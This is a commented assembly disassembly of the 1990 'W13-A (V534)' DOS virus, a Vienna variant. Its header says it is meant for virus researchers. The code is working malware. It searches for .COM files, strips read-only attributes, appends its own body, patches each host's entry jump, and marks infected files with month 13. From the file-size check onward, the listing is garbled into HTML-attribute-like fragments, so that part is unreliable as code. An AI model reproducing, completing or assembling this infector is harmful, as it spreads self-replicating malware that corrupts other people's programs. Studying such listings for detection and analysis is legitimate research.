

	page	,132
	name	V534
	title	V534 - The 'W13 (V534)' virus
	subttl	(Version A; based on the Vienna virus)
	.radix	16

; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", ap. 51        º
; º  Telephone: Private: (+35-92) 58-62-61, Office: (+35-92) 71-401 ext. 255 º
; º									     º
; º			     The 'W13-A (V534)' Virus                        º
; º		   Disassembled by Vesselin Bontchev, April 1990	     º
; º									     º
; º		     Copyright (c) Vesselin Bontchev 1989, 1990 	     º
; º									     º
; º	 This listing is only to be made available to virus researchers      º
; º		   or software writers on a need-to-know basis. 	     º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

; The disassembly does not re-assemble correclty using MASM 5.0.
; Obviously, the original virus was created with another assembler.

code	segment
	assume	cs:code,ds:code

	org	100

start:
	jmp	virentry

	db	(256d - 8) dup (90)	; The original "program"

	mov	ax,4C00
	int	21

virentry:
	push	ax		; Save AX
	mov	si,offset saveins	; Restore original first instruction
modify	equ	$-2		; The instruction above is changed
				;  before each contamination
	mov	dx,si		; Save SI
	add	si,saveins-data
	cld			; Clear direction flag
	mov	cx,3		; Move 3 bytes
	mov	di,offset start ; Move them there
	rep	movsb		; Do it
	mov	di,dx		; Keep DI pointed at data

	mov	ah,30		; Get DOS version
	int	21
	cmp	al,0		; Less than 2.0?
	jne	ver_ok
	jmp	exit		; Exit if so

ver_ok:
	mov	dx,mydta-data	; New DTA address
	add	dx,di
	mov	bx,dx		; Save pointer to it in BX
	mov	ah,1A		; Set DTA
	int	21

; BP contains a flag if the root dir has already
; been searched. 0 means not, -1 means yes.

	mov	bp,0		; Set flag to FALSE

	mov	dx,di
	add	dx,fmask+1-data ; Search all *.COM files in the current dir

srch_lp:
	mov	cx,11b		; Hidden, Read/Only or Normal files
	mov	ah,4E		; Find first file
	int	21
	jmp	errtest

findnext:
	mov	ah,4F		; Find next file
	int	21

errtest:
	jnc	infect		; If found, try to infect it
	cmp	al,12		; File not found error?
	je	nextdir 	; Try the root dir if so
	jmp	olddta		; Otherwise exit

nextdir:
	cmp	bp,-1		; Done with the root dir?
	jne	tryroot 	; Search it if not
	jmp	olddta		; Otherwise exit

tryroot:
	dec	dx		; Search all *.COM files in the root dir
	mov	bp,-1		; Set flag to TRUE
	jmp	srch_lp 	; Go search

infect:
	mov	cx,[bx+date-mydta]	; Get file date
	and	cx,1111b shl 5	; The month more exactly
	cmp	cx,13d shl 5	; Is it 13 (i.e., is file already infected)?
	je	findnext	; Search another file if so
	cmp	word ptr [bx+fsize-mydta],64000d	; Is file size > 64000?
	ja	findnext	; Search another file if so
	cmp	word ptr [bx+fsize-mydta],256d	; Is file size < 256?="" jb="" findnext="" ;="" search="" another="" file="" if="" so="" ;="" file="" not="" infected="" and="" its="" size="" is="" ok.="" infect="" it:="" push="" di="" ;="" save="" di="" mov="" si,bx="" ;="" point="" si="" at="" namez="" add="" si,namez-mydta="" add="" di,14="" cmp="" bp,-1="" ;="" searching="" the="" root="" directory?="" jne="" namecpy="" ;="" skip="" the="" following="" if="" not="" mov="" al,'\'="" ;="" else="" precede="" file="" name="" with="" a="" '\'="" stosb="" ;="" do="" it="" namecpy:="" ;="" copy="" file="" name="" found="" to="" fname="" lodsb="" ;="" get="" byte="" stosb="" ;="" put="" byte="" cmp="" al,0="" ;="" end="" of="" name?="" jne="" namecpy="" ;="" loop="" if="" not="" pop="" di="" ;="" restore="" di="" mov="" dx,di="" add="" dx,fname-data="" ;="" point="" dx="" at="" fname="" mov="" ax,4300="" ;="" get="" file="" attributes="" int="" 21="" mov="" [di+fattrib-data],cx="" ;="" save="" them="" and="" cx,not="" 1="" ;="" turn="" off="" the="" readonly="" bit="" mov="" dx,di="" add="" dx,fname-data="" ;="" point="" dx="" at="" fname="" (but="" it="" still="" points="" there)="" mov="" ax,4301="" ;="" set="" the="" new="" attributes="" int="" 21="" mov="" dx,di="" add="" dx,fname-data="" ;="" point="" dx="" at="" fname="" (but="" it="" still="" points="" there)="" mov="" ax,3d02="" ;="" open="" the="" file="" with="" read/write="" access="" int="" 21="" jnc="" skip1="" ;="" continue="" if="" all="" is="" ok="" jmp="" oldattr="" ;="" exit="" on="" error="" skip1:="" mov="" bx,ax="" ;="" save="" file="" handle="" in="" bx="" mov="" ax,5700="" ;="" get="" file="" date="" &="" time="" int="" 21="" mov="" [di+ftime-data],cx="" ;="" save="" file="" time="" in="" ftime="" mov="" [di+fdate-data],dx="" ;="" save="" file="" date="" in="" fdate="" mov="" ah,3f="" ;="" read="" mov="" cx,3="" ;="" the="" first="" 3="" bytes="" of="" file="" mov="" dx,di="" ;="" store="" them="" in="" saveins="" add="" dx,saveins-data="" int="" 21="" ;="" do="" it="" jnc="" skip2="" ;="" continue="" if="" all="" is="" ok="" jmp="" setftime="" ;="" exit="" on="" error="" (but="" mark="" file="" as="" infected="" )="" skip2:="" cmp="" ax,3="" ;="" three="" bytes="" read?="" jne="" setftime="" ;="" exit="" if="" not="" (but="" mark="" file="" as="" infected="" )="" mov="" ax,4202="" ;="" lseek="" to="" the="" end="" of="" file="" mov="" cx,0="" ;="" (results="" with="" file="" size="" in="" dx:ax)="" mov="" dx,cx="" int="" 21="" sub="" ax,3="" ;="" subtract="" the="" first="" instruction="" length="" mov="" [di+filloc-data],ax="" ;="" save="" corrected="" length="" in="" filloc="" mov="" cx,data-virentry="" cmp="" dx,0="" ;="" file="" less="" than="" 64="" k?="" ;="" (stupid="" question="" for="" *.com="" files)="" jne="" setftime="" ;="" exit="" if="" not="" (but="" mark="" file="" as="" infected="" )="" mov="" dx,di="" ;="" save="" di="" in="" dx="" ;="" point="" di="" at="" virentry="" (data="" -="" (data="" -="" virentry)="=" virentry):="" sub="" di,cx="" add="" di,modify-virentry="" ;="" point="" di="" at="" modify="" add="" ax,virentry-start+3="" add="" ax,cx="" ;="" compute="" data="" offset="" in="" ax="" mov="" [di],ax="" ;="" modify="" the="" instruction="" mov="" ah,40="" ;="" write="" the="" virus="" body="" after="" the="" end="" of="" file="" mov="" di,dx="" ;="" restore="" di="" sub="" dx,cx="" mov="" cx,offset="" endaddr="" ;="" virus="" length="" int="" 21="" jnc="" skip3="" ;="" continue="" if="" all="" is="" ok="" jmp="" setftime="" ;="" exit="" on="" error="" skip3:="" cmp="" ax,offset="" endaddr="" ;="" check="" if="" all="" bytes="" written="" jne="" setftime="" ;="" exit="" on="" error="" mov="" ax,4200="" ;="" lseek="" to="" the="" beginning="" of="" the="" file="" mov="" cx,0="" mov="" dx,cx="" int="" 21="" jc="" setftime="" ;="" exit="" on="" error="" ;="" (have="" you="" ever="" received="" an="" error="" on="" lseek?)="" mov="" ah,40="" ;="" write="" the="" new="" first="" instruction="" (jmp)="" mov="" cx,3="" ;="" length="" of="" this="" instruction="" mov="" dx,di="" add="" dx,newjmp-data="" ;="" get="" it="" from="" there="" (newjmp)="" int="" 21="" ;="" do="" it="" setftime:="" mov="" cx,[di+ftime-data]="" ;="" get="" saved="" file="" date="" &="" time="" mov="" dx,[di+fdate-data]="" and="" dx,not="" (1111b="" shl="" 5)="" ;="" set="" month="" in="" file="" date="" to="" 13="" or="" dx,13d="" shl="" 5="" mov="" ax,5701="" ;="" set="" file="" date="" &="" time="" int="" 21="" mov="" ah,3e="" ;="" close="" file="" handle="" int="" 21="" oldattr:="" mov="" ax,4300="" ;="" get="" (?!)="" file="" attributes="" (must="" be="" set!)="" mov="" cx,[di+fattrib-data]="" int="" 21="" olddta:="" mov="" dx,80="" ;="" restore="" dta="" to="" its="" previous="" state="" mov="" ah,1a="" int="" 21="" exit:="" pop="" ax="" ;="" restore="" ax="" mov="" di,offset="" start="" ;="" jump="" to="" start="" by="" doing="" funny="" ret="" push="" di="" ret="" data="" label="" byte="" ;="" data="" section="" saveins="" db="" 3="" dup="" (90)="" ;="" original="" first="" 3="" bytes="" newjmp="" db="" 0e9="" ;="" code="" of="" jmp="" instruction="" filloc="" dw="" ;="" file="" pointer="" is="" saved="" here="" fmask="" db="" '\????????.com',="" 0="" ;="" filespec="" to="" search="" for="" fname="" db="" 13d="" dup="" (?),="" 0="" ;="" name="" found="" fattrib="" dw="" ;="" file="" attribute="" ftime="" dw="" ;="" file="" date="" fdate="" dw="" ;="" file="" time="" dd="" ;="" not="" used="" ;="" disk="" transfer="" address="" for="" find="" first="" find="" next:="" mydta="" label="" byte="" drive="" db="" ;="" drive="" to="" search="" for="" pattern="" db="" 13d="" dup="" (?)="" ;="" search="" pattern="" reserve="" db="" 7="" dup="" (?)="" ;="" not="" used="" attrib="" db="" ;="" file="" attribute="" time="" dw="" ;="" file="" time="" date="" dw="" ;="" file="" date="" fsize="" dd="" ;="" file="" size="" namez="" db="" 13d="" dup="" (?)="" ;="" file="" name="" found="" message="" db="" 'osoft'="" ;="" db="" 'yright="" microsoft'="" db="" 'yright="" microsoft'="" db="" 'yright="" microsoft'="" db="" 'yright="" microsoft'="" db="" 'yright="" microsoft'="" db="" '="" 1988'="" endaddr="" equ="" $="" code="" ends="" end="" start="" ="">